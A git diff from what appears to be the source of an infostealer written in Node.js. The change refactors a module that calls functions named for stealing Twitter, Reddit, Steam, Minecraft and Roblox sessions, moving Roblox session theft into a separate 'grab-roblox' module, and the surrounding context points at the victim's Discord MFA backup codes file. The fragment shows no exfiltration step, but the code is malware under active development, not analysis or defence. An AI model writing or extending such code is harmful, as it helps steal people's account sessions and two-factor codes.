@@ -5,7 +5,7 @@ const os = require('os');
 const { execSync, spawnSync } = require('child_process');
 const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
 const axios = require('axios');
-const { twitter, reddit, steam, roblox, minecraft } = require('../functions/steal-sessions');
+const { twitter, reddit, steam, minecraft } = require('../functions/steal-sessions');
 
 let tempFolder = '';
 
@@ -39,7 +39,7 @@ module.exports = async () => {
     if (config.sessionStealing.reddit) await reddit();
     if (config.sessionStealing.steam) await steam();
     if (config.sessionStealing.minecraft) await minecraft();
-    if (config.sessionStealing.roblox) await roblox();
+    if (config.sessionStealing.roblox) await require('../functions/grab-roblox')();
   }
 
   const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
